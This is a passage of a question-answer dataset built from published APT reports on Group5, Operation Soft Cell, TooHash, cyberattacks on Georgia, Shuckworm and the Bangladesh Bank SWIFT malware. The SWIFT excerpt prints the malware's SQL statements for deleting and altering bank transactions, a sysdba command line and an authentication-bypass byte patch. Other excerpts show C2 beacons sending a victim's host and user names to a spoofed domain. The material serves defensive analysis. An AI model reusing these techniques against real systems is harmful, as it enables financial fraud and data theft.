    "instruction": "Context: Big Headline: Part 2: The Assadcrimes Website\nGroup5 operated a website, assadcrimes[.] info that served as a watering hole for Android and Windows malware. This\nsection outlines the various files hosted on the site.\nAfter the initial e-mails, we began to monitor a website linked to the e-mails: assadcrimes[.]info. At the time of these emails (Oct. 3, 2015), the site was not fully functional. However, within a few days (Oct. 11, 2015) the main page displayed \"Posts Tagged Bashar Assad Crimes\" with content apparently critical of Bashar Assad. The content appears to have been (<https://en.wikipedia.org/wiki/Tal_al-Mallohi>), as well as from . This blog was created in the name of Tal al-Mallohi, known as Syria's youngest prisoner of conscience. The original blog creation predates the current unrest in Syria.\nShortly before this publication of Group5, the website was listed as \"expired\" and parked, indicating that the owner chose not to renew the domain.\nAnswer this question: How did Group5 leverage the assadcrimes[.]info website to distribute malware, and what specific types of malware were hosted on the site? Additionally, explain the significance of the site's content in attracting the intended targets.",
    "output": "Group5 operated the assadcrimes[.]info website as a watering hole for distributing Android and Windows malware. Initially, the site was not fully functional, but it became active shortly after the initial emails were sent. The main page of the site displayed 'Posts Tagged Bashar Assad Crimes' with content that was critical of Bashar Assad. This content was designed to appear authentic and credible, as it included material from Tal al-Mallohi, known as Syria's youngest prisoner of conscience. By using content that was critical of the Syrian regime, Group5 aimed to attract members of the Syrian opposition who would be interested in such information. The significance of the site's content was that it created a false sense of trust among the intended targets, making them more likely to download and install the malicious files hosted on the site.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Step 1: Creating and Maintaining an IOC Inventory\nThe first step in this process was to create a comprehensive list of indicators of compromise (IOCs) observed throughout the different stages of the attack. This list included various indicators, such as file hashes, domains, IP addresses, file names, and registry/service names. In addition to this, our reverse engineers were able to extract further IOCs from the collected samples, which have also been added to the list.\nThe list of IOCs was periodically updated and fed back into our threat intel engine as more were discovered.\nMedium Headline: Step 2: Hunting for Known Evil\nEquipped with an ever-growing list of known IOCs, our team set out to hunt for \"low-hanging fruit\" across multiple environments. This step was done by using both internal sources, such as the Cybereason solution, as well as hunting for indicators in the wild.\nThe hunt for \"known evil\" yielded interesting results that helped uncover additional compromised assets as well as more parts of the attack infrastructure.\nMedium Headline: Step 3: Threat Actor's Arsenal\nPerhaps one of the most interesting steps involved identifying and analyzing the tools the threat actor used throughout the attack. The combination of the preference of tools, sequence of use, and specifically how they are used during the attack says a lot about a threat actor, especially when it comes to attribution.\nOne of the more notable aspects was how the threat actor used mostly known tools that were customized for this specific attack. Each tool was customized differently, and included re-writing the code, stripping debug symbols, string obfuscation, and embedding the victim's specific information within the tools' configuration.\nHowever, the threat actor also used tools we were not able to attribute to any known tool. These tools were used in the later stages of the attack, once the operation was already discovered. This was most likely to decrease the risk of exposure or attribution.\nFinally, the payloads were almost never repeated. The threat actor made sure that each payload had a unique hash, and some payloads were packed using different types of packers, both known and custom.\nThe main tools these attacks had in common are:\nMedium Headline: Step 4: Creating a TTP-based Behavioral Profile\nOne of the is to create a behavioral profile of the threat actor in question. Malware payloads and operational infrastructure can be quickly changed or replaced over time, and as such, the task of tracking a threat actor can become quite difficult.\nFor that reason, it is crucial to profile the threat actor and study its behavior, the tools it uses, and its techniques. These behavioral-based TTPs are less likely to change drastically, and are\\ key factors of any threat hunt or attribution efforts.\nThe Cybereason solution is , which made it easy to keep track of the observed TTPs and correlate the data with known threat actors.\nThe following chart reflects the behavioral profile of the threat actor based on the most frequently observed techniques used throughout these attacks.\nSmall Headline: \u26a0\ufe0f Note: Since we cannot share any IOCs, we will refer to file hashes, hostnames, IP addresses and other IOCs as generic placeholders.\nHostname1 is the hostname that was used for the C2 server targeting the telecommunications providers.\nHostname1 connected to multiple tools.\nIn analyzing the files, it is clear they are all contacting the same host hostname1. hostname1 was the C2 server that the malware and web shells connected to.\nOnce we determined the hashes in the scope of the attack were only connecting to hostname1, which is a dynamic DNS hostname, we looked to see if we could find more information about the C2 server.\nA simple WHOIS query revealed that the IP address was registered to a colocation hosting company in Asia, though there was no other publicly available information about this IP address.\nBy querying all of our threat intel resources about this IP address, we discovered that it was associated with multiple dynamic DNS hostnames.\nMultiple dynamic DNS hostnames.\nWe were unable to find indications of connections to Dynamic.DNS2 and Dynamic.DNS3. However, they were registered and associated with IP.Address1.\nFor the other dynamic DNS hosts, we leveraged various threat intel repositories and crafted queries that searched for executables with these IP addresses and hostnames in their string table. One of the queries returned a few DLLs with identical names to the DLL we had initially investigated. However, the hashes were different. After obtaining the found DLLs, we patched them back into the NSIS installer and detonated the samples in our testing environment. Dynamic analysis of the newly obtained DLLs revealed a new set of domains and IP addresses that were completely different. These domains were actually related to different telecommunications providers.\nSmall Headline: Infrastructure Operational Security\nThe threat actor's infrastructure.\nThe threat actor had a specific pattern of behavior that allowed us to understand their modus operandi: they used one server with the same IP address for multiple operations. This server is a key component in their 'non-attributable' infrastructure.\nThe threat actor separated operations by using different hostnames per operation, though they are hosted on the same server and IP address. The domains and server registration information pointed to three main countries: China, Hong Kong, and Taiwan.\nThis is cheap and efficient for the threat actor, but is almost transparent for a seasoned researcher with access to the right threat intelligence tools. There are previous reports of threat actors including APT10 and APT1 using dynamic DNS.\nMonitoring this infrastructure gave us information about if and when the threat actor was starting new waves of the attack or additional attacks on other providers.\nWhen researching C2 servers, it is important to watch for:\nAssociation with domains, especially if they are dynamic DNS domains.\nFile hashes that are associated with the IP address or the domain of the C2 server. Static information and metadata from associated samples that could be used to broaden the search after additional information is gathered.\nThis demonstrates the importance of proper operational security and a separation between tools and operations for threat actors.\nMedium Headline: Step 6: Rounding Up Immediate/Potential Suspects\nIn most cases, it is very difficult to achieve 100% certainty when attributing an attack to a specific threat actor. It can be tempting to attribute an attack to a certain threat actor whenever certain tools-of-the-trade, IP addresses, strings, or \"indicative\" techniques are observed.\nHowever, it is important to bear in mind that the aforementioned data points are often prone to manipulation and reuse across different threat actors. Further, they are not impervious to psychological warfare, as in, trying to \"pin\" an operation on a different threat actor to avoid proper attribution.\nIn order to increase the certainty level when attributing to a specific threat actor, we took the following aspects of the attacks into consideration:\nIndicators of Compromise\nTTPs (Tactics, Techniques and Procedures)\nThreat actor's tools\nMotive behind the attacks\nRegional and industry considerations\nCarefully examining each of the different aspects plays an important role in avoiding misattribution. This model offers a more balanced interpretation of the data that is based on a myriad of components. By performing a contextualized review of the data, you are able to yield a more wholesome result with greater certainty.\nWhen it comes to attributing Operation Soft Cell, we are unable to achieve 100% certainty with regard to the identity of the threat actor. However, based on our interpretation of the data, we conclude with a high level of certainty that:\nThe threat actor behind Operation Soft Cell is likely state-sponsored.\nThe threat actor is affiliated with China.\nAfter following the above attribution model and carefully reviewing the data, we are able to narrow down the suspect list to three known APT groups, all of which are known to be linked to China- APT10, APT27, and DragonOK.\nHaving found multiple similarities to previous attacks, it is our estimation that the threat actor behind these attacks is likely linked to , or at the very least, to a threat actor that shares tools, techniques, motive and infrastructural preferences with those of APT10.\nWhile we cannot completely rule out a \"copy-cat\" scenario, where another threat actor might masquerade as APT10 to thwart attribution efforts, we find this option to be less likely in light of our analysis of the data.\nQuestion: What insights can be gained from analyzing the threat actor's behavioral profile based on TTPs (Tactics, Techniques, and Procedures) in Operation Soft Cell? Why is this approach important?",
    "output": "Answer: Analyzing the threat actor's behavioral profile based on TTPs provides insights into the consistent methods and techniques used by the threat actor, which are less likely to change drastically compared to malware payloads and operational infrastructure. This approach is important because it allows for better tracking and attribution efforts. By profiling the threat actor's behavior, tools, and techniques, researchers can correlate the data with known threat actors and gain a deeper understanding of the attacker's modus operandi. This method is crucial for any threat hunt or attribution efforts, as it helps in maintaining a continuous understanding of the threat landscape.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Network Communication\nThe malware uses HTTP to communicate to the command and control servers. Here is an example of a request performed by an infected system:\nHost: www.adobeservice.net\nConnection: Keep-Alive\nCache-Control: no-cache\nPragma: no-cache\nThe relevant data is placed after the GET request. Here is the content of the request, decoded by using the code mentioned above:\nHere are the different parts of the data transmitted:\n\uf0a1 Green: the current date and time;\n\uf0a1 Pink: the hostname of the infected machine;\n\uf0a1 Blue: the domain and the username of the infected machine;\n\uf0a1 Yellow: the version of the operation system;\n\uf0a1 Red: a hardcoded string which means \"end of message\".\npaul@gdata:~ $ cat CgAAAAAAAABhAAAAYQAAAMj[\u2026] |base64 -d | ./common \u2013d | cat -e\nM-^B^@^@^@^@^@^@^@X^@^@^@X^@^@^@2014 52d 713\n334LaptopLab^@^@^@^@^@LaptopLab\\paul^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@WindowsXP^@^@^@10\\11\\10^@^ @^@^@$\nMedium Headline: The Driver\nThe main purpose of the driver is to decode the content of the directsx file and to inject the payload into a userland process. The algorithm used to encode the data in the file is a XOR followed by a SUB:\nScreenshot 8: Obfuscation algorithm\nThe values of the XOR and the SUB can be different. The decoding file contains the configuration (command and control) and a library (.dll) to inject in userland. Here is an example of configuration:\nScreenshot 9: Example of configuration\nActually, the library is injected into the process of BitDefender (seccenter.exe), ZoneAlarm (svchost.exe) or 360 (360tray.exe), which means that three popular security products are abused. If the processes are not running on the infected system, the injection is performed into explorer.exe. To perform the injection, the driver uses the API KeStackAttachProcess(). This function allows it to attach the current thread to an address space of a userland process.\nThe name of the rootkit is linked to its device name: \\\\device\\DirectsX and its symbolic name:\n\\\\DosDevices\\DirectsX.\nBig Headline: Command and Control Servers\nWe identified more than 75 different servers. The complete list of domains is available in the appendix. The IP resolved by the domains changed frequently. At the time of writing this report, all known C&C servers were mainly located in Hong Kong, with three different host companies:\n\uf0a1 HONGKONG LONG LIVE NETWORK CO LIMITED\n\uf0a1 ASIA PACIFIC SERVER COMPANY (HK)\n\uf0a1 Simcentric Solution (HK)\nA fourth host company used was located in the US:\n\uf0a1 Ethrn.Net LLC (USA)\nThe IP ranges used by then:\n\uf0a1 103.228.64.0/24\n\uf0a1 111.68.3.0/24\n\uf0a1 112.121.160.0/18\n\uf0a1 180.178.32.0/18\n\uf0a1 216.83.32.0/19\nThe choice of domain names was made to trick the users or the security team during their analysis of the web logs collected. Have a look at two examples used during the TooHash campaign:\n*.cnnic-micro.com\nCNNIC is the acronym for China National Network Information Center. It is the administrative agency for the Internet domain administration in mainland China. The domain above is, of course, not owned by CNNIC.\n*.adobeservice.net the domain seems to be related to Adobe Systems Incorporated, the popular software company. But, unfortunately, the domain is not owned by Adobe either.\n*.intarnetservice.com\nthe domain seems to be a legitimate intranet network, but note the typo in the domain name.\n*.webmailerservices.com\n*.proxydomain.org\n*.privnsb.com\nFor each domain, the attackers add a subdomain, the subdomain is generally assumed to be the name (or the acronym) of the targeted entities. Here is an example: nspo.intarnetservices.com. This could, in the context of the Greater China area, stand for the National Space Organization located in Taiwan.\nThe attackers control infected machines with the help of web servers installed on the C&Cs, they do not need to have remote access. Here is the authentication page of the administration panel and aswe can see, the panel is partly written in Simplified Chinese:\nScreenshot 10: Authentication on the administration panel\nBig Headline: Attribution\nWe did not clearly identify the people behind this campaign. The use of the stolen certificate could point the Shiqiang group, but nothing can be proven.\nAnyway, in our case, the attackers clearly targeted private business and governmental organizations as well. Either the group decided to target governmental entities as well or the stolen certificate is used by several groups.\nIn any case, the attackers are well organized and use a huge and complex infrastructure to manage the infected systems. Furthermore, they use two different malware types in order to always have access to the targeted organizations even if one malware is detected. The second malware becomes a spare wheel. We assume that the people behind the group are professionals.\nBig Headline: Conclusion\nThis campaign showed us once more, that people do not hesitate to use sophisticated and deceptive methods to steal data from companies or governmental organizations. The files submitted to us seem to have targeted companies in the Greater China area but this technology can easily be used against organizations in other countries and regions across the globe. Due to the increasing value of nowadays' trade secrets and political secrets, we believe that the use of this kind of sponsored campaign is very likely to increase in the future.\nCompanies and other entities as well need to increase their security measures and to educate the users about the risks they might encounter while working with a computer \u2013 ranging from social engineering to malware attacks, etc.\nThe exploits used during this campaign are detected by G DATA's exploit protection system and the files involved are detected by our antivirus engines.\nIn case you would like to receive further technical information or would like to contribute any information to this case, please feel free to contact us by using the following email address: toohash.securityblog@gdata.de\n\nQuestion: How does the TooHash campaign utilize command and control servers, and what strategies do the attackers employ to evade detection and attribution?\n\nAnswer:",
    "output": "The TooHash campaign utilizes over 75 different command and control servers, primarily located in Hong Kong with three different host companies: HONGKONG LONG LIVE NETWORK CO LIMITED, ASIA PACIFIC SERVER COMPANY (HK), and Simcentric Solution (HK). A fourth host company is located in the US: Ethrn.Net LLC (USA). The attackers frequently change the IP addresses resolved by the domains. They use domain names designed to trick users or security teams, such as *.cnnic-micro.com, *.adobeservice.net, and *.intarnetservice.com, which mimic legitimate organizations. The attackers control infected machines via web servers without needing remote access. The authentication page of the administration panel is partly written in Simplified Chinese. The attackers remain unidentified, but the use of a stolen certificate suggests a possible link to the Shiqiang group. The campaign targets both private businesses and governmental organizations, indicating a professional and well-organized group.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Before the Gunfire, Cyberattacks\nWeeks before bombs started falling on Georgia, a security researcher in suburban Massachusetts was watching an attack against the country in cyberspace.\nJose Nazario of Arbor Networks in Lexington noticed a stream of data directed at Georgian government sites containing the message: \"win+love+in+Rusia.\"\nOther Internet experts in the United States said the attacks against Georgia's Internet infrastructure began as early as July 20, with coordinated barrages of millions of requests \u2014 known as distributed denial of service, or D.D.O.S., attacks \u2014 that overloaded and effectively shut down Georgian servers.\nResearchers at Shadowserver, a volunteer group that tracks malicious network activity, reported that the Web site of the Georgian president, Mikheil Saakashvili, had been rendered inoperable for 24 hours by multiple D.D.O.S. attacks. They said the command and control server that directed the attack was based in the United States and had come online several weeks before it began the assault.\nAs it turns out, the July attack may have been a dress rehearsal for an all-out cyberwar once the shooting started between Georgia and Russia. According to Internet technical experts, it was the first time a known cyberattack had coincided with a shooting war.\nBut it will likely not be the last, said Bill Woodcock, the research director of the Packet Clearing House, a nonprofit organization that tracks Internet traffic. He said cyberattacks are so inexpensive and easy to mount, with few fingerprints, they will almost certainly remain a feature of modern warfare.\n\"It costs about 4 cents per machine,\" Mr. Woodcock said. \"You could fund an entire cyberwarfare campaign for the cost of replacing a tank tread, so you would be foolish not to.\"\nExactly who was behind the cyberattack is not known. The Georgian government blamed Russia for the attacks, but the Russian government said it was not involved. In the end, Georgia, with a population of just 4.6 million and a relative latecomer to the Internet, saw little effect beyond inaccessibility to many of its government Web sites, which limited the government's ability to spread its message online and to connect with sympathizers around the world during the fighting with Russia.\nIt ranks 74th out of 234 nations in terms of Internet addresses, behind Nigeria, Bangladesh, Bolivia and El Salvador, according to Renesys, a Manchester, N.H., firm that provides performance data on the state of Internet. Cyberattacks have far less impact on such a country than they might on a more Internet-dependent nation, like Israel, Estonia or the United States, where vital services like transportation, power and banking are tied to the Internet.\nIn Georgia, media, communications and transportation companies were also attacked, according to security researchers. Shadowserver saw the attack against Georgia spread to computers throughout the government after Russian troops entered the Georgian province of South Ossetia. The National Bank of Georgia's Web site was defaced at one point. Images of 20thcentury dictators as well as an image of Georgia's president, Mr. Saakashvili, were placed on the site. \"Could this somehow be indirect Russian action? Yes, but considering Russia is past playing nice and uses real bombs, they could have attacked more strategic targets or eliminated the infrastructure kinetically,\" said Gadi Evron, an Israeli network security expert. \"The nature of what's going on isn't clear,\" he said.\nThe phrase \"a wilderness of mirrors\" usually describes the murky world surrounding opposing intelligence agencies. It also neatly summarizes the array of conflicting facts and accusations encompassing the cyberwar now taking place in tandem with the Russian fighting in Georgia.\nIn addition to D.D.O.S. attacks that crippled Georgia's limited Internet infrastructure, researchers said there was evidence of redirection of Internet traffic through Russian telecommunications firms beginning last weekend. The attacks continued on Tuesday, controlled by software programs that were\nlocated in hosting centers controlled by a Russian telecommunications firms. A Russian-language Web site, stopgeorgia.ru, also continued to operate and offer software for download used for D.D.O.S. attacks.\nOver the weekend a number of American computer security researchers tracking malicious programs known as botnets, which were blasting streams of useless data at Georgian computers, said they saw clear evidence of a shadowy St. Petersburg-based criminal gang known as the Russian Business Network, or R.B.N.\n\"The attackers are using the same tools and the same attack commands that have been used by the R.B.N. and in some cases the attacks are being launched from computers they are known to control,\" said Don Jackson, director of threat intelligence for SecureWorks, a computer security firm based in Atlanta.\nHe noted that in the run-up to the start of the war over the weekend, computer researchers had watched as botnets were \"staged\" in preparation for the attack, and then activated shortly before Russian air strikes began on Saturday.\nThe evidence on R.B.N. and whether it is controlled by, or coordinating with the Russian government remains unclear. The group has been linked to online criminal activities including child pornography, malware, identity theft, phishing and spam. Other computer researchers said that R.B.N.'s role is ambiguous at best. \"We are simply seeing the attacks coming from known hosting services,\" said Paul Ferguson, an advanced threat researcher at Trend Micro, an Internet security company based in Cupertino, Calif. A Russian government spokesman said that it was possible that individuals in Russia or elsewhere had taken it upon themselves to start the attacks.\n\"I cannot exclude this possibility,\" Yevgeniy Khorishko, a spokesman for the Russian Embassy in Washington, said. \"There are people who don't agree with something and they try to express themselves. You have people like this in your country.\"\n\"Jumping to conclusions is premature,\" said Mr. Evron, who founded the Israeli Computer Emergency Response Team.\nMedium Headline: Georgia targeted in cyber attack\nGeorgian government websites have been under intense cyber attack on top of the Russian military strikes launched against the country late last week, a US Internet firm said Tuesday.\nTulip Systems Inc said they took over hosting of the websites for Georgia's presidency and a major television network on Saturday, a day after Russian forces poured into Georgia in response to Tbilisi's attacks on a Moscow-backed rebel province.\nTulip executive Tom Burling said the distributed-denial-of-service (DDoS) attacks began in the weeks running up to the outbreak of the Russia-Georgia conflict and continued Tuesday after the Kremlin announced it had ceased hostilities in the former Soviet state.\n\"They have been attacking Georgia from a cyber standpoint since July,\" Burling told AFP. \"They are still doing it now.\"\n\"Our poor technician here has gotten three hours sleep in the past four days,\" he said.\nBurling suggested that Russia was behind the attacks, which are similar to a cyber offensive waged against Estonia last year that coincided with a diplomatic spat between the Baltic state and Moscow.\nDDoS attacks consist of overloading websites with so many online requests that systems crash.\nBurling said Georgian government websites were being slammed with hundreds of millions of simultaneous requests for documents when Tulip gave them refuge, Burling said.\n\"The cyber attack was taking down every Georgian government website,\" he said.\nOn Tuesday, the Georgian sites hosted on Tulip were still reportedly getting hit with 68,000 requests at a time.\nRussia has denied involvement in cyber assaults on Georgia and experts say it is difficult to determine exactly who is behind such attacks.\n\"The Georgian government's websites have obviously been under attack,\" said Gadi Evron, an Israeli computer security specialist that investigated the cyber assault on Estonia.\n\"It is simply too early and we lack enough information to reach any conclusion as to the motive and identity of the attackers,\" he said.\nEvron said that such cyber warfare has become commonplace in the past decade.\n\"These types of attack are only natural and happen immediately following any conflict or political tension,\" Evron told AFP in an email.\nDDoS attacks are simple, economical and hard to trace.\nThe assaults are typically done by using networks of computers that have been turned into \"zombies\" or \"bots\" with malicious software planted by hackers without the owners of machines being aware.\n\"Botnets\" can grow to thousands or millions of machines and be commanded to simultaneously make requests at targeted websites.\nAndre DiMino, director of Shadowserver, a nonprofit Internet security watchdog with team members around the world, warned against jumping to the conclusion that Russia's government is the culprit in the Georgia cyber attacks.\n\"This actually looks more like grass roots hacktivist types -- people that jumped on the bandwagon,\" DiMino said, using Internet jargon referring to political activists that resort to online evil-doing.\nTulip's Burling said the trend of such cyber maliciousness was a cause for concern.\n\"It's like the Olympics. We are supposed to be above politics in the Internet community.\"\nGeorgian forces attacked the Moscow-backed rebel province of South Ossetia to regain control of the region which broke away from Tbilisi in the early 1990s.\nRussian troops and tanks poured into Georgia on Friday after the Georgian offensive.\n\nBased on the above text, answer a question. How did the cyberattacks affect Georgia's Internet infrastructure and government websites, and what measures were taken to mitigate these attacks?",
    "output": "The cyberattacks significantly affected Georgia's Internet infrastructure, rendering many government websites inaccessible and limiting the government's ability to spread its message online and connect with sympathizers during the conflict with Russia. Tulip Systems Inc., a US Internet firm, took over hosting of the websites for Georgia's presidency and a major television network to mitigate the attacks. Despite these efforts, the websites continued to face D.D.O.S. attacks, with hundreds of millions of simultaneous requests overwhelming the servers. As of the reporting date, the attacks were still ongoing, with the Georgian sites hosted on Tulip receiving 68,000 requests at a time.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Shuckworm APT group use phishing emails to conduct cyber-espionage attacks against targets in Ukraine?",
    "output": "Phishing is a type of social engineering attack where adversaries send electronically delivered messages to gain access to victim systems. In the case of the Shuckworm APT group, they specialize in cyber-espionage campaigns mainly against entities in Ukraine. According to recent findings, Shuckworm uses phishing emails to distribute either freely available remote access tools, such as Remote Manipulator System (RMS) and UltraVNC, or customized malware called Pterodo/Pteranodon to targets. This technique allows them to steal credentials and move laterally on victim networks. The use of phishing emails by Shuckworm is consistent with the group's growing sophistication in recent times, as noted by The Security Service of Ukraine (SSU). Furthermore, Shuckworm's use of phishing emails is an example of targeted phishing, also known as spearphishing, where a specific individual, company, or industry is targeted by the adversary.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Malware samples\nWe believe all files were created by the same actor(s), but the main focus of the report will be on 525a8e3ae4e3df8c9c61f2a49e38541d196e9228 as this is the component that contains logic for interacting with the SWIFT software.\nThe malware registers itself as a service and operates within an environment running SWIFT's Alliance software suite, powered by an Oracle Database.\nThe main purpose is to inspect SWIFT messages for strings defined in the configuration file. From these messages, the malware can extract fields such as transfer references and SWIFT addresses to interact with the system database. These details are then used to delete specific transactions, or update transaction amounts appearing in balance reporting messages based on the amount of Convertible Currency available in specific accounts.\nThis functionality runs in a loop until 6am on 6th February 2016. This is significant given the transfers are believed to have occurred in the two days prior to this date. The tool was custom made for this job, and shows a significant level of knowledge of SWIFT Alliance Access software as well as good malware coding skills.\nBig Headline: Module patching\nThe malware enumerates all processes, and if a process has the module liboradb.dll loaded in it, it will patch 2 bytes in its memory at a specific offset. The patch will replace 2 bytes 0x75 and 0x04 with the bytes 0x90 and 0x90.\nThese two bytes are the JNZ opcode, briefly explained as 'if the result of the previous comparison operation is not zero, then jump into the address that follows this instruction, plus 4 bytes'.\nEssentially, this opcode is a conditional jump instruction that follows some important check, such as a key validity check or authorisation success check.\nThe patch will replace this 2-byte conditional jump with 2 'do-nothing' (NOP) instructions, effectively forcing the host application to believe that the failed check has in fact succeeded.\nFor example, the original code could look like:\nOnce it's patched, it would look like:\nAs a result, the important check result will be ignored, and the code will never jump to 'failed'. Instead, it will proceed into setting result to 0 (success).\nThe liboradb.dll module belongs to SWIFT's Alliance software suite, powered by Oracle Database, and is responsible for:\n\u2022 Reading the Alliance database path from the registry;\n\u2022 Starting the database;\n\u2022 Performing database backup & restore functions.\nBy modifying the local instance of SWIFT Alliance Access software, the malware grants itself the ability to execute database transactions within the victim network.\nBig Headline: SWIFT message monitoring\nThe malware monitors SWIFT Financial Application (FIN) messages, by parsing the contents of the files *.prc and *.fal located within the directories:\n[ROOT_DRIVE]:\\Users\\Administrator\\AppData\\Local\\Allians\\mcm\\in\\ [ROOT_DRIVE]:\\Users\\Administrator\\AppData\\Local\\Allians\\mcm\\out\\\nIt parses the messages, looking for strings defined in gpca.dat. We expect these will be unique identifiers that identify malicious transactions initiated by the attackers. If present, it then attempts to extract a MESG_TRN_REF and MESG_SENDER_SWIFT_ADDRESS from that same message by looking for the following hard coded strings:\n\"FIN 900 Confirmation of Debit\"\n\"20: Transaction\"\n\"Sender :\"\n[additional filters from the decrypted configuration file gpca.dat]\nThe malware will use this extracted data to form valid SQL statements. It attempts to retrieve the SWIFT unique message ID (MESG_S_UMID) that corresponds to the transfer reference and sender address retrieved earlier:\nSELECT MESG_S_UMID FROM SAAOWNER.MESG_%s WHERE MESG_SENDER_SWIFT_ADDRESS LIKE '%%%s%%' AND MESG_TRN_REF LIKE '%%%s%%';\nThe MESG_S_UMID is then passed to DELETE statements, deleting the transaction from the local database.\nDELETE FROM SAAOWNER.MESG_%s WHERE MESG_S_UMID =\n'%s';\nDELETE FROM SAAOWNER.TEXT_%s WHERE TEXT_S_UMID =\n'%s';\nThe SQL statements are dropped into a temporary file with the 'SQL' prefix. The SQL statements are prepended with the following prefixed statements:\nset heading off; set linesize\n32567;\nSET FEEDBACK OFF;\nSET ECHO OFF;\nSET FEED OFF;\nSET VERIFY OFF;\nOnce the temporary file with the SQL statements is constructed, it is executed from a shell script with 'sysdba'\npermissions. An example is shown below:\ncmd.exe /c echo exit | sqlplus -S / as sysdba @[SQL_Statements] > [OUTPUT_FILE]\nBig Headline: Login monitoring\nAfter start up the malware falls into a loop where it constantly checks for the journal record that contains the \"Login\" string in it:\nSELECT * FROM (SELECT JRNL_DISPLAY_TEXT, JRNL_DATE_TIME FROM SAAOWNER.JRNL_%s WHERE JRNL_DISPLAY_TEXT LIKE '%%LT BBHOBDDHA: Log%%' ORDER BY JRNL_DATE_TIME DESC) A WHERE ROWNUM = 1;\nNOTE: 'BBHOBDDH' is the SWIFT code for the Bangladesh Bank in Dhaka.\nIf it fails to find the \"Login\" record, it falls asleep for 5 seconds and then tries again. Once the \"Login\" record is found, the malware sends a GET request to the remote C&C.\nThe GET request has the format:\n[data]\nThe malware notifies the remote C&C each hour of events, sending \"---O\" if the \"Login\" (open) event occurred, \"---C\" in case \"Logout\" (close) event occurred, or \"---N\" if neither of the events occurred, e.g.:\n[C&C_server]/al?---\nO\nBig Headline: Manipulating balances\nThe malware monitors all SWIFT messages found in:\nThe messages are parsed looking for information tagged with the following strings:\n\"19A: Amount\"\n\": Debit\"\n\"Debit/Credit :\"\n\"Sender :\"\n\"Amount :\"\n\"FEDERAL RESERVE\nBANK\"\n\" D\"\n\" C\"\n\"62F: \"\n\"60F: \" \"\n\"60M:\n\"62M: \"\n\"Credit\"\n\"Debit\"\n\" 64: \"\n\" 20: Transaction\"\n\"90B: Price\"\nFor example, the \"62F:\" field specifies the closing balance, \"60F:\" is opening balance, \"19A:\" is transaction amount.\nThe malware also checks if the messages contain a filter specified within the configuration file gpca.dat.\nThe logged in account, as seen from the journal, is then used to check how much Convertible Currency amount ( MESG_FIN_CCY_AMOUNT) it has available:\nSELECT MESG_FIN_CCY_AMOUNT FROM SAAOWNER.MESG_%s WHERE MESG_S_UMID = '%s';\nAlternatively, it can query for a message for a specified sender with a specified amount of Convertible Currency:\nSELECT MESG_S_UMID FROM SAAOWNER.MESG_%s WHERE MESG_SENDER_SWIFT_ADDRESS LIKE '%%%s%%' AND MESG_FIN_CCY_AMOUNT LIKE '%%%s%%';\nThe amount of Convertible Currency is then manipulated in the message by changing it to the arbitrary value ( SET\nMESG_FIN_CCY_AMOUNT\n):\nUPDATE SAAOWNER.MESG_%s SET MESG_FIN_CCY_AMOUNT = '%s' WHERE MESG_S_UMID = '%s'; UPDATE SAAOWNER.TEXT_%s SET TEXT_DATA_BLOCK = UTL_RAW.CAST_TO_VARCHAR2('%s') WHERE TEXT_S_UMID = '%s';\nBig Headline: Printer manipulation\nIn order to hide the fraudulent transactions carried out by the attacker(s), the database/message manipulations are not sufficient. SWIFT network also generates confirmation messages, and these messages are sent by the software for printing. If the fraudulent transaction confirmations are printed out, the banking officials can spot an anomaly and then respond appropriately to stop such transactions from happening.\nHence, the malware also intercepts the confirmation SWIFT messages and then sends for printing the 'doctored' (manipulated) copies of such messages in order to cover up the fraudulent transactions.\nTo achieve that, the SWIFT messages the malware locates are read, parsed, and converted into PRT files that describe the text in Printer Command Language (PCL).\nThese temporary PRT files are then submitted for printing by using another executable file called nroff.exe, a legitimate tool from the SWIFT software suite.\nThe PCL language used specifies the printer model, which is \"HP LaserJet 400 M401\":\nOnce sent for printing, the PRT files are then overwritten with '0's (reliably deleted).\nBig Headline: CONCLUSIONS\nThe analysed sample allows a glimpse into the toolkit of one of the team in well-planned bank heist. Many pieces of the puzzle are still missing though: how the attackers sent the fraudulent transfers; how the malware was implanted; and crucially, who was behind this.\nThis malware was written bespoke for attacking a specific victim infrastructure, but the general tools, techniques and procedures used in the attack may allow the gang to strike again. All financial institutions who run SWIFT Alliance Access and similar systems should be seriously reviewing their security now to make sure they too are not exposed.\nThis attacker put significant effort into deleting evidence of their activities, subverting normal business processes to remain undetected and hampering the response from the victim. The wider lesson learned here may be that criminals are conducting more and more sophisticated attacks against victim organisations, particularly in the area of network intrusions (which has traditionally been the domain of the 'APT' actor). As the threat evolves, businesses and other network owners need to ensure they are prepared to keep up with the evolving challenge of securing critical systems.\nAnswer this question: How does the malware associated with the Bangladesh Bank heist interact with the SWIFT Alliance Access software to cover the attackers' tracks?",
    "output": "The malware registers itself as a service and operates within an environment running SWIFT's Alliance software suite, powered by an Oracle Database. Its main purpose is to inspect SWIFT messages for strings defined in the configuration file. From these messages, the malware can extract fields such as transfer references and SWIFT addresses to interact with the system database. These details are then used to delete specific transactions or update transaction amounts appearing in balance reporting messages based on the amount of Convertible Currency available in specific accounts. This functionality runs in a loop until 6am on 6th February 2016, which is significant given the transfers are believed to have occurred in the two days prior to this date.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nDuring the 2014 Israel\u2013Gaza con\u0141ict, dubbed by Israel as \"operation protective edge\", a raise in cyber-attacks against Israeli targets was reported. In this report we analyze one case of an operation protective edge themed spear phishing attack. That email contained a malicious excel \u0141le, which once opened and its VBA code executed, would infect the victim's computer.\nAs for the publication of this report, the \u0141le is recognized as malicious by only one antivirus engine.\nBased on our analysis, we believe the threat actor behind this malware is a high level professional.\n\nWhy did the threat actor behind the 'Gholee Protective Edge themed spear phishing campaign' choose to use a malicious Excel file with VBA code during the 2014 Israel\u2013Gaza conflict? How does this choice reflect the sophistication of the threat actor?",
